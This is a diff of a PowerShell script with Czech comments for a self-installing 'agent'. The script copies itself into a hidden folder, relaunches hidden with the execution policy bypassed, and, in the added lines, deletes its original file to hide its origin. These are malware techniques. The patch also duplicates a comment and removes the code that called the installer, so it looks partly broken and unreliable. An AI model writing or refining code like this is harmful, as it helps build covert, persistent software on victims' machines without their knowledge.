@@ -13,6 +13,7 @@ $logFile = "$targetFolder\.log"
 $chatId = $null
 
 # FUNKCE: Vytvoř skrytou složku a zkopíruj se tam
+# FUNKCE: Vytvoř skrytou složku a zkopíruj se tam
 function Install-Agent {
     try {
         # Vytvoř složku pokud neexistuje
@@ -26,7 +27,7 @@ function Install-Agent {
         $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
         
         # Zkontroluj jestli už agent není nainstalovaný
-        $currentPath = $MyInvocation.PSCommandPath
+        $currentPath = $PSCommandPath
         
         if($currentPath -ne $targetScript) {
             Write-Host "Kopiruji agenta do: $targetScript"
@@ -38,6 +39,12 @@ function Install-Agent {
             Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$targetScript`""
             
             Write-Host "Agent nainstalovany, spoustim kopii..."
+            
+            # SMAŽ ORIGINÁLNÍ SOUBOR
+            Start-Sleep -Milliseconds 500  # Počkej až se kopie spustí
+            Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
+            Write-Host "Original smazan: $PSCommandPath"
+            
             exit
         } else {
             Write-Host "Agent uz bezi z cilove slozky: $targetScript"
@@ -47,11 +54,6 @@ function Install-Agent {
         Write-Host "ERROR pri instalaci: $_"
         # Pokud selže, pokračuj z aktuálního místa
     }
-}
-
-# Pokud agent neběží z cílové složky, nainstaluj ho
-if($PSCommandPath -ne $targetScript) {
-    Install-Agent
 }
 
 # TEPRVE TEĎ spusť normální funkce agenta
